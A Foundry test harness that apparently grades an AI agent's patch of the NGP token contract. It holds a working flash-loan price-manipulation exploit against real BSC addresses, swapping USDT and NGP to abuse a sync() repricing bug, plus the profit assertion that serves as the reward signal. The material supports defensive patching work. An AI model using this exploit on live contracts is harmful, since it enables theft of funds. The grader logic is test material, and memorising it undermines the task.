// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// HARNESS FILE — hash-locked, read-only. The agent must NOT edit this file.
// PoC for the NGP token _update()/sync() price-manipulation bug (BSC, 2025-09).
//
// State-replay model: at reward time this forks the task's fail-closed record/replay
// RPC proxy (frozen chain state from state/rpc_log.json, no network reachable, with
// FOUNDRY_OFFLINE=true). The vulnerable contract's *patchable* code is compiled from
// src/contracts/Token.sol and vm.etch'd onto the live forked address, so that any
// source patch the agent makes actually governs the exploit while the live storage
// (balances, reserves, whitelist, trade flags) is preserved from the fork.

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

interface IVault { function callback() external; }

contract NGP_PoC is Test {
    IERC20 ngp   = IERC20(0xd2F26200cD524dB097Cf4ab7cC2E5C38aB6ae5c9);
    IERC20 usdt  = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address pair = 0x20cAb54946D070De7cc7228b62f213Fccf3ffb1E;
    address dead = 0x000000000000000000000000000000000000dEaD;

    MockFlashloan mock;
    uint256 constant FLASHLOAN_AMOUNT = 211_000_000 * 1e18;
    uint256 constant PREP_NGP = 1_350_000 * 1e18;
    // Profit oracle: attacker must end with more USDT than they must repay.
    uint256 constant PROFIT_THRESHOLD = 100_000 * 1e18; // real loss was ~2M USDT

    function setUp() public {
        // TASK_FORK_URL is injected by the sandbox: an offline anvil (--load-state) or the
        // task's pinned rpc alias replayed from cache. Falls back to the "bsc" alias.
        string memory url = vm.envOr("TASK_FORK_URL", string("bsc"));
        try vm.createSelectFork(url, 61515894) { }
        catch { vm.createSelectFork(url); }

        // Apply the (patchable) source over the live vulnerable contract, keeping its storage.
        bytes memory patched = vm.getDeployedCode("Token.sol:Token");
        vm.etch(address(ngp), patched);

        mock = new MockFlashloan();
        deal(address(usdt), address(mock), FLASHLOAN_AMOUNT);
        deal(address(usdt), address(this), 0);
        deal(address(ngp), address(this), PREP_NGP);
    }

    function testExploit() public {
        // ---- phase 1: THE EXPLOIT STEP. Only the two router swaps inside the callback, the
        // flash-loan repayment (an unrepayable loan is a genuine block) and the profit
        // assertion below may produce a reason the task recognises as "exploit blocked". The
        // callback's approvals and its balanceOf() read are phased out into PRECONDITION_
        // reasons that match no recognised pattern, so a patch cannot look like a repair by
        // making some other entry point revert with a declared string.
        mock.aggregateFlashloan();
        uint256 profit = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker USDT profit", profit, 18);
        // EXPLOIT ORACLE: the PoC passes iff the attack is profitable. A correct patch
        // makes this assertion fail (or the swap revert), which is the reward signal.
        assertGt(profit, PROFIT_THRESHOLD, "exploit did not yield profit (patched?)");
    }

    function callback() external {
        // ---- phase 0: preconditions. A failure here is NOT evidence of a repair: the
        // approvals are setup, not the exploit, and `approve` is a patchable entry point.
        try this.grantApprovals() { }
        catch { revert("PRECONDITION_UNREADABLE: approve() reverted before the exploit ran"); }
        address[] memory path = new address[](2);

        // 1) swap USDT->NGP to dead: drain the pair's NGP reserve.
        path[0] = address(usdt); path[1] = address(ngp);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(FLASHLOAN_AMOUNT, 0, path, dead, block.timestamp);

        // 2) swap NGP->USDT: the buggy _update() calls pair.sync() mid-transfer,
        //    re-pricing against the manipulated reserve and overpaying USDT.
        path[0] = address(ngp); path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_readNgpBalance(address(this)), 0, path, address(this), block.timestamp);

        // 3) repay flashloan.
        usdt.transfer(address(mock), FLASHLOAN_AMOUNT);
    }

    /// Setup for the callback, in its own external call so a revert can be caught and
    /// relabelled. Called as `this.grantApprovals()`, so `address(this)` — the account whose
    /// allowances are set — is unchanged.
    function grantApprovals() external {
        require(msg.sender == address(this), "internal");
        usdt.approve(address(router), type(uint256).max);
        ngp.approve(address(router), type(uint256).max);
    }

    /// Precondition read. A sabotaged view is an unreadable precondition, never a block.
    function _readNgpBalance(address who) internal view returns (uint256) {
        try ngp.balanceOf(who) returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: balanceOf() view reverted");
        }
    }

    receive() external payable {}
}

contract MockFlashloan {
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    function aggregateFlashloan() public {
        uint256 bal = usdt.balanceOf(address(this));
        usdt.transfer(msg.sender, bal);
        IVault(msg.sender).callback();
        require(usdt.balanceOf(address(this)) == bal, "flashloan not repaid");
    }
}
